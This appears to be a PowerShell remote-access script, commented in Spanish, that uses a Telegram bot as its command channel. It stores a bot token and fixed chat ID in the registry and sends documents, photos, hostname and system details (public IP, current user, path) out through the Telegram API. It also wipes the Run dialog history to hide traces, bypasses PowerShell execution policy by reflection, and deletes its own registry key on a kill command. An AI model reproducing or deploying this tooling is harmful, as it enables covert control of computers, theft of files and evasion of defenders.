#########################################
## Configuración del Bot
#########################################
function New-MyTelegramConfiguration{
    param([String]$ApiToken)
    $RegKey = "HKCU:\Software\classes\MyTelegram"
    New-Item -Path $RegKey -Force | Out-Null
    New-ItemProperty $RegKey -Name 'BotKey' -Value $ApiToken -Force | Out-Null
    New-ItemProperty $RegKey -Name 'ChatID' -Value "685749607" -Force | Out-Null
    New-ItemProperty $RegKey -Name 'LastUpdateID' -Value 0 -Force | Out-Null
}

# Obtiene los últimos Telegrams
function Get-TelegramTimeLine{
    param([int]$MaxinumMessages)

    $RegKey = "HKCU:\Software\classes\MyTelegram"
    $botkey = (Get-ItemProperty -Path $RegKey).BotKey
    $lastUpdate = (Get-ItemProperty -Path $RegKey).LastUpdateID
    $telegrams = (iwr -Uri "https://api.telegram.org/bot$BotKey/getUpdates?offset=$lastUpdate" -UseBasicParsing).content
    $telegrams = ConvertFrom-Json $telegrams 
    [PSObject[]]$msgs = $null;$count=0

    for($i=$telegrams.result.count-1;$i -ne 0;$i--){
        $msgs += $telegrams.result[$i]
        $count++
        if($count -eq $MaxinumMessages){
            break
        }
    }
    return $msgs
}

# Envia texto al chat
function Send-Results{
     param([string]$chat_id,
           [string]$texto)

     $RegKey = "HKCU:\Software\classes\MyTelegram"
     $BotKey = (Get-ItemProperty -Path $RegKey).botkey
     Invoke-Webrequest -uri "https://api.telegram.org/bot$BotKey/sendMessage?chat_id=$chat_id&text=$texto" -Method post -UseBasicParsing| Out-Null
}

# Envia imagen al chat
function Send-Photo{
    param([String]$File)

    $RegKey = "HKCU:\Software\classes\MyTelegram"
    $BotKey = (Get-ItemProperty -Path $RegKey).Botkey
    $chat_id = (Get-ItemProperty -Path $RegKey).ChatID   
    $uri = "https://api.telegram.org/bot$BotKey/sendPhoto"
    
    $Form = @{
        chat_id              = $chat_id
        photo                = Get-Item -Path $File -ErrorAction Stop
        caption              = $Caption
        parse_mode           = $ParseMode
        disable_notification = $DisableNotification
    }    
    $invokeRestMethodSplat = @{
        Uri = $Uri
        ErrorAction = 'Stop'
        Form = $Form
        Method = 'Post'
    }    
    $results = Invoke-RestMethod @invokeRestMethodSplat
}

# Envia documento al chat (máximo 50 MB)
function Send-Document{
    param([String]$File)

    $RegKey = "HKCU:\Software\classes\MyTelegram"
    $BotKey = (Get-ItemProperty -Path $RegKey).Botkey
    $chat_id = (Get-ItemProperty -Path $RegKey).ChatID

    $file_object = Get-Item $File -ErrorAction Stop
    
    $Uri = "https://api.telegram.org/bot$BotKey/sendDocument"
    $Form = @{
        chat_id              = $chat_id
        document             = $file_object
        caption              = [System.Net.Dns]::GetHostName()
        parse_mode           = $ParseMode
        disable_notification = $DisableNotification
    }    
    $invokeRestMethodSplat = @{
        Uri = $Uri
        ErrorAction = 'Stop'
        Form = $Form
        Method = 'Post'
    }    
    $results = Invoke-RestMethod @invokeRestMethodSplat
}

# Obtiene el último Telegram leido
function Get-LastUpdateID{
    $RegKey = "HKCU:\Software\classes\MyTelegram"
    return (Get-ItemProperty -Path $RegKey).LastUpdateID
}

# Modifica el último Telegram leído
function Update-Time{
    param([string]$LastUpdateID)
    $LastUpdateID
    $RegKey = "HKCU:\Software\classes\MyTelegram"
    New-ItemProperty $RegKey -Name 'LastUpdateID' -Value $LastUpdateID -Force | Out-Null
}

function Clear-Fingerprints{
    reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
}

function Disable-ExecutionPolicy{
    $ctx = $ExecutionContext.GetType().GetField("_context","nonpublic,instance").GetValue($ExecutionContext)
    $ctx.GetType().GetField("_authorizationManager","nonpublic,instance").SetValue($ctx, (New-Object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))
}

function Get-RandomPath{
    $set = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
    $word = "\"
    $word += $set | Get-Random -Count 30
    $word = $word -replace(" ","")
    $word += ".txt"
    $ruta = $env:TEMP
    $ruta += $word
    return $ruta
}

function Get-SystemInfo{
    $propeties = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | Select-Object ProductName, ReleaseId, CurrentBuild 
    $system = $propeties.ProductName + " " + $propeties.Released + $propeties.CurrentBuild
    $ip = '[+] Public IP: ' + $(Get-PublicIP)
    $cu = "[+] Current user: " + $(whoami)
    $cp = "[+] Current path: " + $(pwd)
    $systeminfo = $system + "`n" + $ip + "`n" + $cu + "`n" + $cp

    return $systeminfo
}

function Get-PublicIP{
    $ip = ''
    try{
        $response = New-Request -URL 'http://checkip.dyndns.com/'
        $ip = $response | Select-String -Pattern '\d+.\d+.\d+.\d+' | foreach {$_.Matches.Groups[0].Value}
    } catch [System.Exception] {
        return 
    }

    return $ip
}

function Kill{
    $RegKey = "HKCU:\Software\classes\MyTelegram"
    Remove-Item -Path $RegKey -Force | Out-Null
    exit
}
